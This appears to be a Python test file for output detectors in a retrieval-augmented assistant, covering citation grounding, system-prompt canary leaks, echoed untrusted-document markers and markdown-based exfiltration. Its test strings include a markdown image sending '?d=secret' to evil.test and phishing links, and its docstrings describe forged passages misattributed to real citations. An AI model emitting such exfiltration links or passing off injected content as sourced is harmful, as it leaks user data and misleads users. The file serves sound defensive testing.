"""Deterministic checks on a finished answer.

Hermetic. These are the layer that does not guess: concrete output in, yes or no
out. They are detectors rather than a gate, because the answer streams and the
caller has read it by the time it is complete.
"""

from knowledge_desk.outputchecks import check_answer
from knowledge_desk.providers import _SYSTEM, SYSTEM_CANARY

CTX = [{"path": "a.txt", "text": "Refunds take five business days after approval."},
       {"path": "b.txt", "text": "Parental leave accrues from the start date."}]


def codes(answer, contexts=CTX):
    return [f["code"] for f in check_answer(answer, contexts)]


def test_a_grounded_answer_raises_nothing():
    assert codes('Refunds take five days [1] "refunds take five business days", '
                 'and leave accrues [2] "parental leave accrues from the start".') == []


# --- evidence spans -------------------------------------------------------


def test_a_quote_that_is_not_in_the_cited_passage_is_flagged():
    """The gap citation *existence* leaves open. A model that reads a forged
    policy can attribute it to the real key of the passage that carried it, at
    which point the key check passes and the false claim reads as sourced."""
    assert "citation_unsupported" in codes(
        'Policy says [1] "refunds are instant and unconditional".')


def test_a_quote_from_the_wrong_passage_is_flagged():
    """Right key, real text, wrong source. Detached rather than invented."""
    assert "citation_unsupported" in codes(
        'Refunds [1] "parental leave accrues from the start date".')


def test_a_quote_matching_apart_from_wrapping_and_case_is_accepted():
    """Lenient on purpose: a quote differing only by line wrapping is the model
    reproducing the passage correctly, and a false positive here is what turns a
    warning list into something nobody reads."""
    assert codes('See [1] "REFUNDS   TAKE\nFIVE business days" for detail.') == []


def test_curly_quotes_parse_as_evidence_spans():
    assert codes('See [1] \u201crefunds take five business days\u201d.') == []


def test_a_citation_with_no_evidence_span_is_flagged():
    """Verified against nothing. Reported, because otherwise a model that quietly
    stops quoting disables the check above and everything keeps reading green."""
    assert codes("Refunds take five business days [1].") == ["citation_unquoted"]


def test_an_out_of_range_citation_is_not_also_reported_as_unquoted():
    assert codes("As [9] says.") == ["citation_out_of_range"]


def test_the_canary_is_actually_in_the_system_prompt():
    """Otherwise the check tests nothing and nobody finds out."""
    assert SYSTEM_CANARY in _SYSTEM


# --- citations ------------------------------------------------------------


def test_a_citation_beyond_the_retrieved_passages_is_flagged():
    assert codes("As stated in [7], refunds are instant.") == ["citation_out_of_range"]


def test_citation_zero_is_flagged():
    assert codes("See [0].") == ["citation_out_of_range"]


def test_every_out_of_range_citation_is_named_once():
    finding = check_answer("See [7], [9], and [7] again.", CTX)[0]
    assert "[7]" in finding["detail"] and "[9]" in finding["detail"]


def test_a_refusal_with_no_passages_cites_nothing():
    assert codes("I don't have anything I'm allowed to cite.", []) == []


# --- prompt structure coming back out -------------------------------------


def test_an_echoed_fence_marker_is_flagged():
    assert "fence_echoed" in codes("The passage began at <<<UNTRUSTED_DOCUMENT 1a2b>>>.")


def test_an_echoed_marker_spelled_with_a_lookalike_is_still_flagged():
    """An output check that reads bytes is exactly where a respelling is most
    embarrassing, because this is the layer meant to be reliable."""
    assert "fence_echoed" in codes("It said <<<UNTRUSTED_DОCUMENT 1a2b>>> first.")


def test_an_echoed_system_prompt_is_flagged():
    assert "system_prompt_echoed" in codes(f"My instructions say: {SYSTEM_CANARY} ...")


# --- exfiltration channels ------------------------------------------------


def test_a_markdown_image_is_flagged():
    assert "markdown_image" in codes("Done ![](https://evil.test/x.png?d=secret)")


def test_a_markdown_link_is_flagged():
    assert "markdown_link" in codes("See [the portal](https://evil.test/login).")


def test_an_image_is_not_also_counted_as_a_link():
    assert codes("![alt](https://evil.test/x.png)") == ["markdown_image"]


def test_a_bare_url_in_prose_is_deliberately_not_flagged():
    """The honest boundary of this layer. A prose phishing link has no structural
    handle, and catching it needs domain reputation rather than a regex. Asserted
    so the omission is a decision on the record instead of an oversight."""
    assert codes("For help visit https://evil.test/support and sign in.") == []
